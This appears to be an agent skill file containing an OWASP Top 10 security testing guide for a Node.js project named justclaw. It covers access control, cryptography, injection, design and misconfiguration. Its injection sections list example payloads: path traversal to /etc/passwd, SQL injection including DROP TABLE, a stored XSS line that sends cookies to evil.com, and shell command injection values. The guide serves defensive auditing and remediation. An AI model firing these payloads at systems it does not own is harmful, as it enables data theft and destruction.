---
name: owasp-testing-guide
description: "OWASP Top 10 (2021) security testing methodology. Test procedures, example payloads, and remediation for each category. Use for security audits, code reviews, and penetration testing."
---

# OWASP Top 10 (2021) Security Testing Guide

Reference skill for conducting security audits against OWASP Top 10 categories. Tailored for Node.js/TypeScript applications including MCP servers, Discord bots, SQLite databases, and CLI tools.

Categories A06-A10 and the audit checklist are in [owasp-a06-a10.md](owasp-a06-a10.md).

## OWASP Top 10 Overview

| Rank | Category | CWE Examples | Severity |
|------|----------|-------------|----------|
| A01 | Broken Access Control | CWE-200, CWE-284, CWE-285, CWE-352, CWE-639 | Critical |
| A02 | Cryptographic Failures | CWE-259, CWE-327, CWE-328, CWE-331 | High-Critical |
| A03 | Injection | CWE-79 (XSS), CWE-89 (SQLi), CWE-78 (OS Cmd) | Critical |
| A04 | Insecure Design | CWE-209, CWE-256, CWE-501, CWE-522 | High |
| A05 | Security Misconfiguration | CWE-16, CWE-611, CWE-1004 | Medium-High |
| A06 | Vulnerable and Outdated Components | CWE-1035, CWE-1104 | Variable |
| A07 | Identification and Authentication Failures | CWE-287, CWE-384, CWE-613 | High-Critical |
| A08 | Software and Data Integrity Failures | CWE-345, CWE-502, CWE-829 | High |
| A09 | Security Logging and Monitoring Failures | CWE-117, CWE-223, CWE-532, CWE-778 | Medium |
| A10 | Server-Side Request Forgery (SSRF) | CWE-918 | High-Critical |

## CVSS Severity and Remediation Timeline

| CVSS Score | Severity | Remediation SLA |
|------------|----------|-----------------|
| 9.0-10.0 | Critical | 24-72 hours |
| 7.0-8.9 | High | 1-2 weeks |
| 4.0-6.9 | Medium | 1 month |
| 0.1-3.9 | Low | Next release cycle |

---

## A01: Broken Access Control

### What to Test

- Missing authorization checks on MCP tool endpoints
- Privilege escalation between tool namespaces
- Direct object reference (IDOR) via predictable IDs in SQLite queries
- Path traversal in file read/write operations
- CORS misconfiguration on dashboard endpoints

### Test Procedures

**1. Authorization bypass on MCP tools**
```
Check: Does every MCP tool verify caller identity before executing?
Test: Call privileged tools (process_restart_self, memory_forget) without proper context.
Look for: Tools that execute without checking authorization context.
```

**2. Path traversal in file operations**
```
Test payloads: ../../../etc/passwd, ..%2f..%2f..%2fetc%2fpasswd, ....//....//etc/passwd
Check: Does the application resolve paths and verify they stay within allowed directories?
Example: notebook_create with path="/../../../etc" should be rejected.
```

**3. IDOR in SQLite records**
```
Test: Access tasks/memories/conversations by sequential ID.
Check: Can one channel's Discord session access another channel's data?
```

**4. Horizontal privilege escalation**
```
Test: Modify target_channel on a task to redirect output to unauthorized channel.
Test: Use state_set to overwrite another component's state keys.
```

### Remediation

- Enforce authorization at the tool handler level, not just the transport layer
- Validate and sanitize all file paths against an allowlist of base directories
- Use parameterized queries with row-level access checks
- Implement channel-scoped data isolation for multi-channel Discord bots

---

## A02: Cryptographic Failures

### What to Test

- Secrets in plaintext (.env files, environment variables, config)
- Sensitive data in SQLite stored unencrypted (tokens, API keys)
- Hardcoded secrets in source code
- Insecure random number generation

### Test Procedures

**1. Secrets in source code**
```bash
grep -rn "password\s*=" src/ --include="*.ts"
grep -rn "token\s*=" src/ --include="*.ts"
grep -rn "api_key\|apikey\|api-key" src/ --include="*.ts"
grep -rn "[A-Za-z0-9+/]{40,}" src/ --include="*.ts"
grep "\.env" .gitignore
```

**2. Database encryption**
```bash
sqlite3 data/charlie.db "SELECT key, substr(content, 1, 50) FROM memories WHERE type='credential' OR tags LIKE '%secret%';"
strings data/charlie.db-wal | grep -i "token\|password\|secret" | head -20
```

**3. Random number generation**
```typescript
// INSECURE: Math.random() for security-sensitive values
const token = Math.random().toString(36);

// SECURE: crypto.randomBytes or crypto.randomUUID
import { randomBytes, randomUUID } from 'node:crypto';
const token = randomBytes(32).toString('hex');
```

### Remediation

- Never store secrets in SQLite; use environment variables loaded from .env
- Use `node:crypto` for all security-sensitive random generation
- Serve dashboard over HTTPS or behind a reverse proxy with TLS
- Rotate secrets periodically; implement secret versioning

---

## A03: Injection

### SQL Injection Testing

justclaw uses SQLite with `better-sqlite3`. Test all query construction points.

**Union-based SQLi**
```
' UNION SELECT sql FROM sqlite_master--
' UNION SELECT key,content,type,tags,namespace,1,1,1 FROM memories--
```

**Time-based blind SQLi (SQLite-specific)**
```
' AND 1=1 AND (SELECT COUNT(*) FROM memories)>0--
'; SELECT CASE WHEN (1=1) THEN RANDOMBLOB(100000000) ELSE 0 END--
```

**Error-based SQLi**
```
' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INT)--
' AND LOAD_EXTENSION('evil.so')--
```

**Where to test in justclaw:**
```
memory_search(query: "' OR 1=1--")
memory_recall(key: "test' UNION SELECT * FROM state--")
conversation_search(query: "'; DROP TABLE conversations;--")
task_list(tag: "' OR '1'='1")
notebook_query(query: "' UNION SELECT content FROM document_chunks--")
```

**Verification pattern:**
```typescript
// VULNERABLE: string concatenation
db.prepare(`SELECT * FROM memories WHERE key = '${key}'`).all();

// SAFE: parameterized query
db.prepare('SELECT * FROM memories WHERE key = ?').all(key);
```

### XSS Testing

Relevant for the dashboard (Hono :8787) and any HTML rendering.

**Reflected XSS**
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

**Stored XSS (via memories/tasks rendered in dashboard)**
```
memory_save(key: "test", content: "<script>fetch('https://evil.com/'+document.cookie)</script>")
task_create(title: "<img src=x onerror='alert(1)'>")
```

### OS Command Injection

Relevant for monitor commands, claude-spawn, and any exec/spawn calls.

**Test payloads for monitor command source:**
```
monitor_create(source_type: "command", source_config: { command: "echo test; cat /etc/passwd" })
monitor_create(source_type: "command", source_config: { command: "$(whoami)" })
```

**Verification pattern:**
```typescript
// VULNERABLE: shell interpolation
execSync(`curl ${userUrl}`);

// SAFER: use spawn with argument array (no shell)
spawn('curl', [userUrl], { shell: false });
```

### Remediation

- Always use parameterized queries with better-sqlite3
- Escape all HTML output in dashboard responses
- Sanitize monitor command configs; consider an allowlist of permitted commands
- Never pass user input to shell via string interpolation

---

## A04: Insecure Design

### What to Test

- Missing rate limiting on MCP tool calls
- No resource quotas (unbounded memory_save, task_create)
- Missing input validation schemas on tool parameters
- Sensitive data exposure in error messages

### Test Procedures

**1. Resource exhaustion**
```
Test: Call memory_save in a loop -- is there a limit on total memories?
Test: Create tasks with very large description fields -- is there a size limit?
Test: notebook_create on a directory with thousands of files -- does it OOM?
```

**2. Error information leakage**
```
Test: Trigger errors in MCP tools and check if stack traces or file paths leak.
Test: Send malformed JSON to the MCP server -- does it expose internal structure?
```

**3. Business logic flaws**
```
Test: Can task_complete be called on a task owned by a different agent?
Test: Can context_restore retrieve snapshots from other sessions?
Test: Can session rotation be forced by manipulating turn_count via state_set?
```

### Remediation

- Implement resource quotas: max memories per namespace, max task description length
- Add input validation schemas (zod) at the MCP tool boundary
- Sanitize error messages before returning to callers
- Add rate limiting per channel/caller for Discord bot interactions

---

## A05: Security Misconfiguration

### What to Test

- Missing security headers on dashboard
- Debug mode enabled in production
- Permissive CORS settings
- SQLite PRAGMA security settings

### Test Procedures

**1. Dashboard security headers**
```bash
curl -I http://localhost:8787/ 2>/dev/null | grep -iE "x-frame|x-content|strict-transport|content-security|referrer-policy|permissions-policy"
```

**2. SQLite security pragmas**
```sql
PRAGMA trusted_schema = OFF;       -- prevent malicious schema triggers
PRAGMA cell_size_check = ON;       -- detect corruption
PRAGMA journal_mode = WAL;         -- already set
PRAGMA busy_timeout = 5000;        -- already set
```

**3. PM2 and Node.js configuration**
```bash
ss -tlnp | grep 9229                    # Node.js inspector port
grep -r "JUSTCLAW_DEBUG" .env            # debug mode
```

**4. File permissions**
```bash
ls -la data/charlie.db                   # should not be world-readable
ls -la .env                              # should be restricted
find src/ -perm -o+w -type f             # no world-writable source
```

### Security Headers Reference

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Security-Policy` | `default-src 'self'` | Prevent XSS, data injection |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME sniffing |
| `X-Frame-Options` | `DENY` | Prevent clickjacking |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Force HTTPS |
| `X-XSS-Protection` | `0` | Disable legacy XSS filter (CSP replaces) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Control referer leakage |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Disable unnecessary APIs |
| `Cache-Control` | `no-store` (for sensitive data) | Prevent caching |

### Remediation

- Add all security headers to the Hono dashboard middleware
- Set `PRAGMA trusted_schema = OFF` in db.ts initialization
- Restrict file permissions: `chmod 600 .env data/charlie.db`
- Disable debug mode in production
